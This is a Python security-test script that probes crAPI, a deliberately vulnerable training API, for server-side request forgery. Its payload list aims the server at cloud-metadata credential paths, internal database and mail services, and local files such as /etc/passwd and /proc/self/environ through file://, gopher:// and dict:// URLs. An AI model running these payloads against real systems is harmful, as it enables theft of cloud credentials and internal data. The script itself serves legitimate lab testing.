#!/usr/bin/env python3
"""
OWASP API Security Top 10:2023 - API7: Server Side Request Forgery (SSRF)
Target: crAPI running on Docker (default port 8888)

crAPI's /workshop/api/mechanic/contact_mechanic endpoint accepts a
user-supplied URL (`mechanic_api`) and makes a server-side HTTP request to it.
This is a textbook SSRF vulnerability.

Tests for:
  - SSRF to internal Docker network services
  - SSRF to cloud metadata endpoints (169.254.169.254)
  - SSRF to localhost services
  - URL scheme bypass attempts (file://, dict://, gopher://)
"""

import requests
import json
import sys

from crapi_config import BASE_URL, USER1_EMAIL, USER1_PASSWORD, USER2_EMAIL, USER2_PASSWORD
USER_EMAIL = USER1_EMAIL
USER_PASSWORD = USER1_PASSWORD



# Safe SSRF canary: use a service you control, e.g., http://169.254.169.254/
# or an internal Docker service. We'll probe several.
SSRF_TARGETS = [
    # Cloud metadata (AWS/GCP style)
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    # Internal Docker network (common internal IPs)
    "http://172.17.0.1:8888/identity/api/v2/admin/users",
    "http://127.0.0.1:8025/",          # MailHog internal
    "http://localhost:8025/api/v2/messages",  # MailHog API
    "http://172.17.0.1:27017/",        # MongoDB
    "http://172.17.0.1:5432/",         # PostgreSQL
    # URL scheme probes
    "file:///etc/passwd",
    "dict://127.0.0.1:11211/stat",     # Memcached
]


def get_token():
    r = requests.post(f"{BASE_URL}/identity/api/auth/login",
                      json={"email": USER_EMAIL, "password": USER_PASSWORD})
    if r.status_code == 200:
        return r.json().get("token")
    return None


def get_vehicle_info(token):
    headers = {"Authorization": f"Bearer {token}"}
    r = requests.get(f"{BASE_URL}/identity/api/v2/vehicle/vehicles", headers=headers)
    if r.status_code == 200 and r.json():
        v = r.json()[0]
        return v.get("vin"), v.get("uuid")
    return None, None


def send_mechanic_request(token, mechanic_api_url, repeat=False):
    """Send a contact_mechanic request with a custom mechanic_api URL."""
    headers = {"Authorization": f"Bearer {token}"}
    vin, _ = get_vehicle_info(token)

    payload = {
        "mechanic_api": mechanic_api_url,
        "problem_details": "Probe request for SSRF test",
        "vin": vin or "TESTVIN0000001",
        "mechanic_code": "TRAC_JHJ",
        "repeat_request_if_failed": repeat,
        "number_of_repeats": 1
    }

    try:
        r = requests.post(f"{BASE_URL}/workshop/api/mechanic/contact_mechanic",
                          headers=headers, json=payload, timeout=10)
        return r.status_code, r.text
    except requests.exceptions.Timeout:
        return 0, "TIMEOUT (server hung - possible internal connection)"
    except Exception as e:
        return -1, str(e)


def test_ssrf_legitimate_baseline(token):
    """First confirm the endpoint works with a legitimate URL."""
    print(f"\n[API7:SSRF] Baseline - Legitimate mechanic_api URL")
    legitimate_url = f"{BASE_URL}/workshop/api/mechanic/"
    status, body = send_mechanic_request(token, legitimate_url)
    print(f"  Legitimate URL: {legitimate_url}")
    print(f"  Response: HTTP {status} → {body[:150]}")
    return status == 200


def test_ssrf_internal_targets(token):
    """
    API7 Test: Point mechanic_api at internal network targets.
    If the server makes requests to internal services, SSRF is confirmed.
    """
    print(f"\n[API7:SSRF] SSRF to Internal Network Targets")
    vulnerable_targets = []

    for target_url in SSRF_TARGETS:
        status, body = send_mechanic_request(token, target_url)
        body_preview = body[:120].replace("\n", " ")

        indicator = ""
        if status == 0:
            indicator = "TIMEOUT ← potential internal connection"
        elif status == 200:
            # Check if response contains internal data
            if any(kw in body.lower() for kw in ["root:", "/etc/", "credential", "ami-", "meta-data",
                                                   "iam", "messages", "mongo", "postgres"]):
                indicator = "VULNERABLE - INTERNAL DATA RETURNED!"
                vulnerable_targets.append(target_url)
            else:
                indicator = f"HTTP 200 (external data or benign)"
        elif status == 400:
            indicator = "HTTP 400 - may be blocked"
        elif status == 403:
            indicator = "HTTP 403 - blocked"
        elif status == 500:
            indicator = "HTTP 500 - server error (possible SSRF attempt processed)"
        else:
            indicator = f"HTTP {status}"

        print(f"\n  Target: {target_url}")
        print(f"  Status: {indicator}")
        print(f"  Body:   {body_preview}")

    if vulnerable_targets:
        print(f"\n  [VULNERABLE] SSRF confirmed! {len(vulnerable_targets)} internal targets accessible:")
        for t in vulnerable_targets:
            print(f"    - {t}")
        return True

    print(f"\n  [PROTECTED or UNRESOLVABLE] No internal data returned from SSRF probes")
    print(f"  NOTE: In a real lab, use Burp Collaborator or a listener on your Docker bridge IP")
    return False


def test_ssrf_via_redirect(token):
    """
    API7 Test: Can we chain SSRF through an open redirect on a trusted domain?
    Simulate pointing at a URL that redirects to an internal target.
    """
    print(f"\n[API7:SSRF] SSRF via URL Redirect Bypass Probe")
    # This simulates what an attacker would do if there were allowlist bypass via redirect
    # Without a live redirect server, we just document the attack vector
    redirect_url = "http://localhost:8888/workshop/api/redirect?url=http://127.0.0.1:8025/"
    status, body = send_mechanic_request(token, redirect_url)
    print(f"  Redirect URL: {redirect_url}")
    print(f"  Response: HTTP {status} → {body[:150]}")
    if status == 200 and "8025" in body:
        print(f"  [VULNERABLE] Redirect-chained SSRF succeeded!")
        return True
    else:
        print(f"  [INFO] Redirect probe returned HTTP {status}")
        return False


def test_ssrf_url_scheme_bypass(token):
    """
    API7 Test: Try non-HTTP URL schemes to read local files or probe services.
    """
    print(f"\n[API7:SSRF] URL Scheme Bypass (file://, gopher://)")
    scheme_targets = [
        "file:///etc/passwd",
        "file:///proc/self/environ",
        "gopher://127.0.0.1:11211/_stats",
        "dict://127.0.0.1:11211/stat",
    ]

    vulnerable = False
    for url in scheme_targets:
        status, body = send_mechanic_request(token, url)
        body_preview = body[:120]
        print(f"  Scheme: {url.split('://')[0]}")
        print(f"  URL:    {url}")
        print(f"  Result: HTTP {status} → {body_preview}")
        if status == 200 and ("root:" in body or "PATH=" in body):
            print(f"  [VULNERABLE] Local file read via SSRF scheme!")
            vulnerable = True
        print()

    if not vulnerable:
        print(f"  [PROTECTED] Non-HTTP schemes appear to be blocked or unsupported")

    return vulnerable


def main():
    print("=" * 60)
    print("  crAPI - API7: Server Side Request Forgery (SSRF)")
    print("=" * 60)
    print(f"\nTarget: {BASE_URL}")
    print(f"\nNOTE: For best SSRF detection, set up a listener on your Docker")
    print(f"bridge IP (typically 172.17.0.1) and watch for inbound connections.\n")

    token = get_token()
    if not token:
        print("[ERROR] Authentication failed. Check USER_EMAIL/USER_PASSWORD.")
        sys.exit(1)
    print(f"[AUTH] Token acquired: {token[:40]}...")

    baseline = test_ssrf_legitimate_baseline(token)
    if not baseline:
        print("\n[WARN] Baseline mechanic request failed. Vehicle may not be set up.")
        print("       Add a vehicle via the crAPI UI, then re-run this script.")

    results = []
    results.append(("Baseline Mechanic Endpoint",       (baseline, "[baseline]")))
    vuln1 = test_ssrf_internal_targets(token)
    vuln2 = test_ssrf_via_redirect(token)
    vuln3 = test_ssrf_url_scheme_bypass(token)

    print("\n" + "=" * 60)
    print("  RESULTS SUMMARY")
    print("=" * 60)
    for name, vuln in [("SSRF to Internal Targets", vuln1),
                       ("SSRF via Redirect Chain",  vuln2),
                       ("SSRF URL Scheme Bypass",   vuln3)]:
        status = "VULNERABLE ⚠️ " if vuln else "PROTECTED  ✅"
        print(f"  {status}  {name}")
    print()
    print("  The contact_mechanic endpoint DESIGN is SSRF-vulnerable by")
    print("  definition — a user-supplied URL triggers a server-side request.")
    print("  Confirm with an out-of-band listener (Burp Collaborator, interactsh, etc.)")
    print()


if __name__ == "__main__":
    main()
